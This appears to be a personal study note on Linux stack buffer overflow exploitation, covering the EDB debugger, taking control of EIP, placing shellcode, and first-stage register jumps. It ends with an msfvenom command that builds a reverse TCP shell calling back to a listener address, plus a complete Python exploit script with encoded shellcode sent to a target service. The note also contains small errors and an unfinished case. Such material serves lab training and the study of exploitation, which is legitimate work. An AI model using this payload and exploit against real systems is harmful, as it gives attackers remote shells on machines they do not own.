## Fuzzing Linux

This document will follow much of the same process as the Windows\BufferOverflow\FuzzingWin32.md document, so for more details, see that document.

### EDB  - Linux debugger

#### Commands

| Command | Description                              |
| ------- | ---------------------------------------- |
| F9      | Run                                      |
| CTRL+O  | OpcodeSearched: Searches for a jump code |
| CTRL+B  | BreakpointManager: Set a breakpoint      |
| F7      | Step into (single-step)                  |
|         |                                          |

### Controlling EIP

1. Generate unique string with `msf-pattern_create -l LENGTH`
2. Send string in payload
3. Check EIP register to see what hex string appears
4. Use msf-pattern again to find that subset in your main string and thus the offset:  `msf-pattern_offset -l LENGTH -q HEX#_FROM_EIP`
5. Re-write script to send filler equal to the offset value and then a test string to insert into EIP, plus any needed additional filler, then re-run

Once EIP control is obtained, EIP can be set to point to the address of the instructions you want to run.  Remember to reverse the order of the bytes for 'Little Endian' format.  Where you point depends on where you are able to put your shellcode.

### Locate Space for Shellcode

After EIP control is obtained, then examine the other registers.  You need to figure out where you can put your shellcode

- Case 1:  ESP points to an area you can use.
  - If ESP is already pointing to an area of memory large enough to fit your shellcode, just put the code there and find a JMP ESP statement in the program or one of the DLL's to have execution jump to that position.
- Case 2:  Another register points to an area of memory you control
  - ???
- Case 3:  No other register points to an area of memory you control, but there it does point to an address you can execute to gain control.
  - Regular text in memory can translate to useful instruction code.  To examine what text would translate to, right click the register and choose 'Copy to clipboard'.  Then right click in the disassembler window and choose 'Goto Expression' and put the address from the register in, proceeded by `0x`.
- Case 4:  No other register points to an area of memory you control, but you have a small amount of space where ESP is point you can use.
  - You can use this space to initiate 1st stage shell code to align a register to point to an area of memory you control, then jump to the location in that register to continue execution.

#### Creating 1st stage shell code

You can use the nasm shell from metasploit to generate the opcodes for operations.

```bash
# Ex: add 12 bytes to the eax register
msf-nasm_shell
nasm > add eaxm,12
# Output
00000000 83C00C			add eax,bye +0xc
nasm > jmp eax
00000000 FFE0			jmp eax
```

Take these generated instructions and insert them into the shellcode where you are able to execute from, padding with NOP's (`\x90`), if needed.

### Create Main Shellcode

Once you have decided where to put the shellcode, generate it using msfvenom:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.216 LPORT=8000 EXITFUNC=thread -f python -e x86/shikata_ga_nai -b "\x00\x20" -v shellcode
```

Insert this code into your program, but remember to include a NOP sled to deal with the decoder function's destructive habits.

### Final Code Example

```python
#!/usr/bin/python3
import socket
host = "192.168.216.44"
eip = b"\x96\x45\x13\x08"
nopsled = b"\x90" * 8
shellcode =  b""
shellcode += b"\xda\xd2\xd9\x74\x24\xf4\xbd\x26\x3a\xf4\x4f"
shellcode += b"\x5a\x2b\xc9\xb1\x12\x83\xc2\x04\x31\x6a\x13"
shellcode += b"\x03\x4c\x29\x16\xba\xa1\x96\x21\xa6\x92\x6b"
shellcode += b"\x9d\x43\x16\xe5\xc0\x24\x70\x38\x82\xd6\x25"
shellcode += b"\x72\xbc\x15\x55\x3b\xba\x5c\x3d\x7c\x94\xe8"
shellcode += b"\x65\x14\xe7\x16\x8a\xa5\x6e\xf7\x04\x43\x21"
shellcode += b"\xa9\x37\x3f\xc2\xc0\x56\xf2\x45\x80\xf0\x63"
shellcode += b"\x69\x56\x68\x14\x5a\xb7\x0a\x8d\x2d\x24\x98"
shellcode += b"\x1e\xa7\x4a\xac\xaa\x7a\x0c"
crash = b"\x41" * (4368 - len(shellcode) - len(nopsled))
first_stage = b"\x83\xc0\x0c\xff\xe0\x90\x90"
buffer = b"\x11(setup sound " + nopsled + shellcode + crash + eip + first_stage +"\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print ("[*]Sending evil buffer...")
s.connect((host, 13327))
print (s.recv(1024))
s.send(buffer)
s.close()
print ("[*]Payload Sent !")
```

